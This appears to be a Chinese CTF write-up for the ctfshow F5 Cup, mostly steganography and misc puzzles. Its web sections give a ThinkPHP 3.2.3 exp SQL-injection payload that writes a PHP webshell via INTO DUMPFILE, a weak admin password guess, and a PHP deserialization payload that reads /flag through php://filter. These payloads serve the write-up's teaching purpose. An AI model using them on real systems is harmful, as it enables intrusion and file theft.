---
title: ctfshow F5杯
categories: 赛题wp
---
## lastsward's website
>知识点：SQL注入写Webshell


网站是TP3的框架，在网上找到了 

弱口令爆破 admin 123456

![](https://img-blog.csdnimg.cn/20210225002841871.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
<!--more-->
[thinkphp 3.2.3 exp注入漏洞分析](https://zhuanlan.zhihu.com/p/127208753)

Payload:?id[0]=exp&id[1]==1 or sleep(5)

Dumpfile：

[MySQL注入中的outfile、dumpfile、load_file函数详解](https://www.cnblogs.com/zztac/p/11371149.html)

![](https://img-blog.csdnimg.cn/20210225003108917.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
看到

![](https://img-blog.csdnimg.cn/2021022500311871.png#pic_center)
构造：
```
select * from game where id =2 into dumpfile
"/var/www/html/shell.php"#
```
payload:
```
http://510e80c4-677f-425c-b539-413bc7ac3ab1.chall.ctf.show:8080/index.php/Home/Game/gameinfo/?gameId[0]=exp&gameId[1]==2 into dumpfile "/var/www/html/shell.php"%23
```
先访问一下shell.php发现显示游戏名字

修改第二个游戏名字为 <?php phpinfo()?>再次利用payload,再次访问shell.php 即可

![](https://img-blog.csdnimg.cn/20210225003244482.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
## eazy-unserialize&eazy-unserialize-revenge
>知识点 ：反序列化

```bash
class Happy{ 
    public $file='flag.php'; 

    function __destruct(){ 
        if(!empty($this->file)) { 
            include $this->file; 
        } 
    } 

} 

function ezwaf($data){ 
    if (preg_match("/ctfshow/",$data)){ 
        die("Hacker !!!"); 
    } 
    return $data; 
} 
if(isset($_GET["w_a_n"])) { 
    @unserialize(ezwaf($_GET["w_a_n"])); 
} else { 
    new CTFSHOW("lookme", array()); 
}

```
了解析构函数

>析构函数的作用和构造函数正好相反，析构函数只有在对象被垃圾收集器收集前（即对象从内存中删除之前）才会被自动调用。析构函数允许我们在销毁一个对象之前执行一些特定的操作，例如关闭文件、释放结果集等。
在 PHP 中有一种垃圾回收机制，当对象不能被访问时就会自动启动垃圾回收机制，收回对象占用的内存空间。而析构函数正是在垃圾回收机制回收对象之前调用的。
析构函数的声明格式与构造函数相似，在类中声明析构函数的名称也是固定的，同样以两个下画线开头的方法名__destruct()，而且析构函数不能带有任何参数。

通过Happy类的__destruct魔术方法，存在文件包含的漏洞，这里通过php伪协议进行源码读取

先序列化一次
```bash
<?php
class Happy{ 
    public $file='php://filter/read=convert,base64-encode/resource=/flag'; 
} 
echo serialize(new Happy());
?>
```
Payload:
```
?w_a_n=O:5:"Happy":1:{s:4:"file";s:54:"php://filter/read=convert,base64-encode/resource=/flag";}
```

---
## 迷惑行为大赏之盲注
>知识点： 特殊字符处理 与 sql盲注中文字符

[github wp](https://github.com/ctfwiki/subject_misc_ctfshow/blob/master/20200821_%E5%BA%9F%E7%89%A9%E6%9D%AF_%E8%BF%B7%E6%83%91%E8%A1%8C%E4%B8%BA%E5%A4%A7%E8%B5%8F%E4%B9%8B%E7%9B%B2%E6%B3%A8/Readme.md)

kali下：

五个库

![](https://img-blog.csdnimg.cn/20210225003951454.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
测试库：
![](https://img-blog.csdnimg.cn/20210225004032790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
![](https://img-blog.csdnimg.cn/20210225004039479.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
![](https://img-blog.csdnimg.cn/20210225004059839.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
字段名包含@，sqlmap默认配置跑不出数据

存在@的特殊字符，得用`反引号括起来`

Kali下跑不出来 windows跑出来了

![](https://img-blog.csdnimg.cn/20210225004140524.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
## 两行代码一纸情书
给了dll文件

IDA打开一堆base64  疯狂解码
ctfshow{I_LOVE_YOU_AND_PLEASE_LOVE_ME}

---
## Just Another 拼图
>知识点：png结构

![](https://img-blog.csdnimg.cn/20210225004453642.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
解压得12图片

Linux下发现图片全都无法正常查看，说明二进制数据肯定被动过手脚。strings命令看一下

发现所有图片都包含IDAT字符串，10.jpg还包括IHDR字符串。那么很明显，一张png图片被拆成12个IDAT块（其中一块还包括IHDR块），然后藏在了12张jpg图片的二进制数据里面。进一步用十六进制编辑器查看可以发现，IDAT块的数据都是正好插在jpg的文件尾标记FF D9前面。从而可以提取出这12段数据，再拼接上png文件头和文件尾就可以得到原来的png图片。

IHDR前后长度共25个字节

![](https://img-blog.csdnimg.cn/20210225004547927.png#pic_center)

IDAT 含有49 44 41 54  前面4 个字节个别不同

![](https://img-blog.csdnimg.cn/20210225004614735.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
![](https://img-blog.csdnimg.cn/20210225004622503.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
![](https://img-blog.csdnimg.cn/202102250046349.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
调节idat块的位置 得到完整图片

脚本

```bash
path = 'C:/Users/Administrator/Desktop/Just Another 拼图/puzzle/puzzle'

data = [''] * 12
for i in range(12):
    data[i] = open(path + str(i) + '.jpg', 'rb').read()

HEAD = 0x89504E470D0A1A0A.to_bytes(8, 'big')
IHDR = data[10][0x29EA : 0x2A03]

IDAT = [''] * 12
for i in range(12):
    n = data[i].find(b'IDAT') - 4
    IDAT[i] = data[i][n : -2]
    print(len(IDAT[i]))

PNG = HEAD + IHDR + IDAT[10]
for i in range(10):
    PNG += IDAT[i]
PNG += IDAT[11]
out = open(path + '.png', 'wb')
out.write(PNG)
out.close()

```

---
## F5还会学中文
>知识点：中文编码 区位码

一张f5图片 一个flag加密压缩包

打开照片发现缺少zip文件头 添加后另存为


![](https://img-blog.csdnimg.cn/20210225004954505.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
竟然是Ook！
ctfshow—>Ook  F—>.  5—>!  杯—>?

得到  F5's password is f5alsogood

F5隐写

![](https://img-blog.csdnimg.cn/20210225005031920.png#pic_center)
报错 原因是文件尾部有其他痕迹  清理一下尾部  解密

![](https://img-blog.csdnimg.cn/20210225005243468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

得到zip-password-is-Every0neL0veBeF5

解压

![](https://img-blog.csdnimg.cn/20210225005345200.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
![](https://img-blog.csdnimg.cn/20210225005354277.png#pic_center)
查询区位码

![](https://img-blog.csdnimg.cn/20210225005444251.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
得到的数字十进制转十六进制再转字符串

---
## 填字游戏
>知识点：谷歌

![](https://img-blog.csdnimg.cn/20210225005619799.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

提取文字后 谷歌搜索一下

发现网站：
![](https://img-blog.csdnimg.cn/2021022500565139.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
![](https://img-blog.csdnimg.cn/20210225005659397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

![](https://img-blog.csdnimg.cn/20210225005722443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
65 69 97 53 121 70  108  52 103

最后asc转码

---
## 牛年大吉3.0
>知识点：MP3stego,oursecret , 盲水印 解密工具

Ppt 发现不显眼的字符串 高亮  第一张有音频 提取

![](https://img-blog.csdnimg.cn/20210225010102751.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
放au里什么都看不出来

用到mp3stego去解密，密码为Y3Rmc2hvd25i，得到8208208820
用法：
```
  decode.exe -X -P 123456 test.mp3
```

![](https://img-blog.csdnimg.cn/20210225010218304.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
Binwalk分离ppt进去发现3张一样的照片 且大小差距大

![](https://img-blog.csdnimg.cn/20210225010302854.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
1，7 放进our secret 密码8208208820

![](https://img-blog.csdnimg.cn/20210225010455385.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
分离出demon.png  demon7.png

考虑盲水印

使用 linyacool /blind-watermark python2 没有成功

![](https://img-blog.csdnimg.cn/20210225010649291.png#pic_center)
![](https://img-blog.csdnimg.cn/20210225010736140.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
 base58解码

---
## F5也会LSB
>知识点：lsb隐写

![](https://img-blog.csdnimg.cn/2021022501120689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
以为每个密码都不同 手动创建n多副本 只留一个文件解密
最后发现密码相同114514

![](https://img-blog.csdnimg.cn/20210225011220687.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
结合lsb 考虑lsb隐写  打开数字 1

![](https://img-blog.csdnimg.cn/20210225011238414.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
发现504b030414   zip文件头

收集全部信息获得zip 发现加密 解密得7775

![](https://img-blog.csdnimg.cn/20210225011312304.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
查看数字1 的BGR  2 1通道发现 f

![](https://img-blog.csdnimg.cn/20210225011332256.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
数字2

![](https://img-blog.csdnimg.cn/20210225011344466.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
收集全部  flag{F5_th1nk_s0_Ez}


---
## GoodNight
>知识点：套娃罢了(哭)
>BPG文件头是425047FB， B190是文件尾
>D4 C3 B2 A1为 pcap 十六进制文件头  是流量包

Hint1:题目的附件名字很重要 Hint2:flag的内容要转为md5 flag

附件一张照片

Oursecret  密码就是GoodNight

![](https://img-blog.csdnimg.cn/20210225011703678.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
010打开查看文件头，发现BP，考点是BPG，可以查到bpg文件头是425047FB， B190是文件尾，4250后面添加上的47FB，然后搜索B190，这里在第2个B190处截断，因为后面有6050B405，是反过来的504B0304

![](https://img-blog.csdnimg.cn/20210225012037390.png#pic_center)
![](https://img-blog.csdnimg.cn/20210225012045420.png#pic_center)
[字符串反转](http://tool.huixiang360.com/str/reverse.php)

添加头部信息 504b0304

![](https://img-blog.csdnimg.cn/20210225012136406.png#pic_center)
破解压缩包

发现十六进制文件

![](https://img-blog.csdnimg.cn/2021022501221075.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
D4 C3 B2 A1为pcap十六进制文件头  是流量包

考虑tcp隐写

![](https://img-blog.csdnimg.cn/20210225012229714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
![](https://img-blog.csdnimg.cn/20210225012252170.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
多次点击每条记录发现为一句话  

只有identification数值改变 提取出来数值
```
64 105 72 60 44 123 42 59 111 85 112 47 105 109 34 81 80 108 96 121 82 42 105 101 125 78 75 59 46 68 33 88 117 41 98 58 74 91 82 106 43 54 75 75 77 55 80 64 105 72 60 44 123 42 59 111 85 112 47 105 109 34 81 80 108 96 121 82
```

十进制转文本 再base91

![](https://img-blog.csdnimg.cn/20210225012430913.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
## 大小二维码
>知识点：存储二进制数据的二维码、二维码的Mask Pattern

拿到大二维码da.png，尝试扫描会发现，要么是一堆乱码，要么只有开头几个字符，但开头两位必定是7z，这是7zip格式的文件头。事实上这个二维码存放的数据类型是4，即二进制数据，数据内容是一个7z格式压缩包。利用ZXing等工具将二进制数据提取后解压，得到文件夹xiao。

文件夹里是0-34共35张二维码，当然一张都扫不出来。仔细对比会发现所有二维码的数据区和校验区都是一模一样的，`唯一的不同是每个定位点旁边的掩码类型`。进一步可以发现，Error Correction Level都是L，区别在于Mask Pattern。
例如第一张二维码的Mask Pattern，三个定位符处的Mask Pattern都不一样：

![](https://img-blog.csdnimg.cn/20210225013425813.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

![](https://img-blog.csdnimg.cn/20210225013432940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
所以这里手动将35张图全部手动对比下来，得到一串0-7的数字，猜想是8进制，并且3位为一组并转为ascii
